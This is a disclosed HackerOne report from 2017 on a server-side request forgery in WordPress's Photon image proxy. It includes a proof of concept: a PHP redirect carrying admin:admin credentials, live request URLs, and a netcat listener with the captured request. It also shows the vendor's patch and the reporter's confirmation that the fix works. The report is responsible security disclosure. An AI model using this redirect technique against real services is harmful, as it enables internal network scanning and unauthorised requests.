{"id":204513,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDQ1MTM=","url":"https://hackerone.com/reports/204513","title":"Infrastructure - Photon - SSRF","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-02-08T10:06:44.378Z","submitted_at":"2017-02-08T10:06:44.378Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"skansing","url":"/skansing","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/039/510/0486a9d2ba97f04a35e587c7483914cb5299c526_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":55,"url":"https://hackerone.com/wordpress","handle":"wordpress","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"WordPress","twitter_handle":"wordpress","website":"https://wordpress.org/","about":"Beautiful sites of any kind."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-07-17T23:50:14.884Z","bug_reporter_agreed_on_going_public_at":"2017-06-17T23:50:07.613Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Description\n------------------------\nThe service Photon located at `http://i0.wp.com/` and described at `https://code.trac.wordpress.org/browser/photon/` is vulnerable to Http SSRF via. redirect.\n\nThe redirect can go to any IP (including inside of any firewall photon might be inside) any port and can add auth headers.\n\nThe service does try to protect itself against this type of attack by using\n```\n// https://code.trac.wordpress.org/browser/photon/index.php#L111\ncurl_setopt( $ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS );\n```\nBut this does not guard against internal IP's, auth redirects nor other port attacks via http/https.\n\nDue to the different responses an attacker can use the service to scan and attack IP ranges for http services, do malicious actions and etc. \n\nPOC\n-----------------------------------\n**First a demo that the service does not allow firing requests to any port.**\n\n*Note you can bust the cache by changing the params given to Photon, so if no response is given, just bump n+1 on resize param or add a new param*\n\n- Goto `http://i0.wp.com/159.203.190.123:666/new.php?resize=0,1`\n- The responds `Sorry, the parameters you provided were not valid`\n\nThis protection happens because of the filter validation\n\n```\n// https://code.trac.wordpress.org/browser/photon/index.php#L142\nif ( isset( $_GET['q'] ) ) {\n        if ( $origin_domain_exception \u0026 PHOTON__ALLOW_QUERY_STRINGS ) {\n                $url .= '?' . preg_replace( '/#.*$/', '', (string) $_GET['q'] );\n                unset( $_GET['q'] );\n        } else {\n                httpdie( '400 Bad Request', 'Sorry, the parameters you provided were not valid' );\n        }\n}\n\t\nif ( false === filter_var( $url, FILTER_VALIDATE_URL, FILTER_FLAG_PATH_REQUIRED ) )\n        httpdie( '400 Bad Request', 'Sorry, the parameters you provided were not valid' );\n```\n\n\n**Now a demo of bypassing the port restriction and appending authorization headers.**\n- Goto `http://i0.wp.com/159.203.190.123/new.php?resize=0,2`\n- The server gets a incoming request and responds with a 302\n`192.0.102.120 - - [08/Feb/2017:04:15:44 -0500] \"GET /new.php HTTP/1.1\" 302 199 \"-\" \"Photon/1.0\"`\n- Photon blindly follow the redirect, here is the output of a netcat listening in with the following command. `nc -l -p 666` and the Photon coming in\n\n```\nGET / HTTP/1.1\nHost: 159.203.190.123:666\nAuthorization: Basic YWRtaW46YWRtaW4=\nUser-Agent: Photon/1.0\nAccept: */*\n```\nThe contents of `new.php` \n```\n\u003c?php\nheader('Location: http://admin:admin@159.203.190.123:666');\n```\n\n\nPossible Fixes\n-----------------------\nThe side effects of the SSRF is =\u003e redirect to any IP, to any port, auth headers.\n\nI have seached for a way to configure these things in cURL but without success.\nI would recommend doing 1 request at a time, manually parsing the response and initiating a new request if the validates for such criteria.\n\nAlso consider using `curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, TRUE );` atm. the link is vuln to MITM attack as the certs are not verified.  \n\n ","vulnerability_information_html":"\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\n\u003cp\u003eThe service Photon located at \u003ccode\u003ehttp://i0.wp.com/\u003c/code\u003e and described at \u003ccode\u003ehttps://code.trac.wordpress.org/browser/photon/\u003c/code\u003e is vulnerable to Http SSRF via. redirect.\u003c/p\u003e\n\n\u003cp\u003eThe redirect can go to any IP (including inside of any firewall photon might be inside) any port and can add auth headers.\u003c/p\u003e\n\n\u003cp\u003eThe service does try to protect itself against this type of attack by using\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e// https://code.trac.wordpress.org/browser/photon/index.php#L111\ncurl_setopt( $ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS );\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBut this does not guard against internal IP\u0026#39;s, auth redirects nor other port attacks via http/https.\u003c/p\u003e\n\n\u003cp\u003eDue to the different responses an attacker can use the service to scan and attack IP ranges for http services, do malicious actions and etc. \u003c/p\u003e\n\n\u003ch2 id=\"poc\"\u003ePOC\u003c/h2\u003e\n\n\u003cp\u003e\u003cstrong\u003eFirst a demo that the service does not allow firing requests to any port.\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003cem\u003eNote you can bust the cache by changing the params given to Photon, so if no response is given, just bump n+1 on resize param or add a new param\u003c/em\u003e\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eGoto \u003ccode\u003ehttp://i0.wp.com/159.203.190.123:666/new.php?resize=0,1\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eThe responds \u003ccode\u003eSorry, the parameters you provided were not valid\u003c/code\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThis protection happens because of the filter validation\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e// https://code.trac.wordpress.org/browser/photon/index.php#L142\nif ( isset( $_GET[\u0026#39;q\u0026#39;] ) ) {\n        if ( $origin_domain_exception \u0026amp; PHOTON__ALLOW_QUERY_STRINGS ) {\n                $url .= \u0026#39;?\u0026#39; . preg_replace( \u0026#39;/#.*$/\u0026#39;, \u0026#39;\u0026#39;, (string) $_GET[\u0026#39;q\u0026#39;] );\n                unset( $_GET[\u0026#39;q\u0026#39;] );\n        } else {\n                httpdie( \u0026#39;400 Bad Request\u0026#39;, \u0026#39;Sorry, the parameters you provided were not valid\u0026#39; );\n        }\n}\n\nif ( false === filter_var( $url, FILTER_VALIDATE_URL, FILTER_FLAG_PATH_REQUIRED ) )\n        httpdie( \u0026#39;400 Bad Request\u0026#39;, \u0026#39;Sorry, the parameters you provided were not valid\u0026#39; );\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eNow a demo of bypassing the port restriction and appending authorization headers.\u003c/strong\u003e\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eGoto \u003ccode\u003ehttp://i0.wp.com/159.203.190.123/new.php?resize=0,2\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eThe server gets a incoming request and responds with a 302\n\u003ccode\u003e192.0.102.120 - - [08/Feb/2017:04:15:44 -0500] \u0026quot;GET /new.php HTTP/1.1\u0026quot; 302 199 \u0026quot;-\u0026quot; \u0026quot;Photon/1.0\u0026quot;\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003ePhoton blindly follow the redirect, here is the output of a netcat listening in with the following command. \u003ccode\u003enc -l -p 666\u003c/code\u003e and the Photon coming in\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET / HTTP/1.1\nHost: 159.203.190.123:666\nAuthorization: Basic YWRtaW46YWRtaW4=\nUser-Agent: Photon/1.0\nAccept: */*\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe contents of \u003ccode\u003enew.php\u003c/code\u003e \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eheader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Location: http://admin:admin@159.203.190.123:666\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"possible-fixes\"\u003ePossible Fixes\u003c/h2\u003e\n\n\u003cp\u003eThe side effects of the SSRF is =\u0026gt; redirect to any IP, to any port, auth headers.\u003c/p\u003e\n\n\u003cp\u003eI have seached for a way to configure these things in cURL but without success.\u003cbr\u003e\nI would recommend doing 1 request at a time, manually parsing the response and initiating a new request if the validates for such criteria.\u003c/p\u003e\n\n\u003cp\u003eAlso consider using \u003ccode\u003ecurl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, TRUE );\u003c/code\u003e atm. the link is vuln to MITM attack as the certs are not verified.  \u003c/p\u003e\n","bounty_amount":"350.0","formatted_bounty":"$350","weakness":{"id":68,"name":"Server-Side Request Forgery (SSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-07-17T23:50:07.695Z","allow_singular_disclosure_after":-108882278.56306191,"singular_disclosure_allowed":true,"vote_count":19,"voters":["bl4de","bogdantcaciuc","skansing","ak1","madrobot","eveeez","r3y","vulnh0lic","linkks","zerotoone","and 9 more..."],"severity":{"rating":"medium","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1489634,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the report.\n\nI'm currently working on a patch for these issues and will send it over for review / testing shortly, there's just a few things I need to check on first (we're not explicitly blocking specifying port numbers or auth credentials for example, that's a side effect of `parse_url( $_SERVER['REQUEST_URI'] );` returning false under certain circumstances)","markdown_message":"\u003cp\u003eThanks for the report.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m currently working on a patch for these issues and will send it over for review / testing shortly, there\u0026#39;s just a few things I need to check on first (we\u0026#39;re not explicitly blocking specifying port numbers or auth credentials for example, that\u0026#39;s a side effect of \u003ccode\u003eparse_url( $_SERVER[\u0026#39;REQUEST_URI\u0026#39;] );\u003c/code\u003e returning false under certain circumstances)\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-16T17:44:00.569Z","updated_at":"2017-02-16T17:44:00.569Z","actor":{"username":"vortfu","cleared":false,"url":"/vortfu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/982/1ef285fb263d30f189dc6a8038e1d5c46086e9d9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1489727,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @vortfu ,\n\nNice, thanks for the update on the report.\n\nLooking forward to reading the fix =) \n\nAny chance we could triage the report?","markdown_message":"\u003cp\u003eHey \u003ca href=\"/vortfu\"\u003e@vortfu\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eNice, thanks for the update on the report.\u003c/p\u003e\n\n\u003cp\u003eLooking forward to reading the fix =) \u003c/p\u003e\n\n\u003cp\u003eAny chance we could triage the report?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-16T18:18:35.128Z","updated_at":"2017-02-16T18:18:35.128Z","actor":{"username":"skansing","cleared":false,"url":"/skansing","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/510/0486a9d2ba97f04a35e587c7483914cb5299c526_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1502208,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"We've released a patch which should fix this.\n\nIf you could please verify that https://code.trac.wordpress.org/changeset/439/photon/index.php correctly addresses the issues mentioned in your report, we can go ahead and `Resolve` the issue.","markdown_message":"\u003cp\u003eWe\u0026#39;ve released a patch which should fix this.\u003c/p\u003e\n\n\u003cp\u003eIf you could please verify that \u003ca title=\"https://code.trac.wordpress.org/changeset/439/photon/index.php\" href=\"/redirect?url=https%3A%2F%2Fcode.trac.wordpress.org%2Fchangeset%2F439%2Fphoton%2Findex.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://code.trac.wordpress.org/changeset/439/photon/index.php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e correctly addresses the issues mentioned in your report, we can go ahead and \u003ccode\u003eResolve\u003c/code\u003e the issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-23T21:29:51.519Z","updated_at":"2017-02-23T21:29:51.519Z","actor":{"username":"vortfu","cleared":false,"url":"/vortfu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/982/1ef285fb263d30f189dc6a8038e1d5c46086e9d9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1502290,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I tried to reproduce any of the issues mentioned in the report (SSRF, AUTH) and have not been able to.\n\nNice fix.","markdown_message":"\u003cp\u003eI tried to reproduce any of the issues mentioned in the report (SSRF, AUTH) and have not been able to.\u003c/p\u003e\n\n\u003cp\u003eNice fix.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-02-23T22:05:49.956Z","updated_at":"2017-02-23T22:05:49.956Z","actor":{"username":"skansing","cleared":false,"url":"/skansing","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/510/0486a9d2ba97f04a35e587c7483914cb5299c526_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1514741,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-02T02:47:59.064Z","updated_at":"2017-03-02T02:47:59.064Z","actor":{"username":"vortfu","cleared":false,"url":"/vortfu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/982/1ef285fb263d30f189dc6a8038e1d5c46086e9d9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"skansing","url":"/skansing"},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1514742,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-02T02:51:01.735Z","updated_at":"2017-03-02T02:51:01.735Z","actor":{"url":"/wordpress","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"WordPress"}},"bounty_amount":"350.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"wordpress","collaborator":{"username":"skansing","url":"/skansing"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1763589,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-06-17T23:50:07.650Z","updated_at":"2017-06-17T23:50:07.650Z","first_to_agree":true,"actor":{"username":"skansing","cleared":false,"url":"/skansing","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/510/0486a9d2ba97f04a35e587c7483914cb5299c526_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1844906,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-07-17T23:50:14.927Z","updated_at":"2017-07-17T23:50:14.927Z","actor":{"url":"/wordpress","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"WordPress"}},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}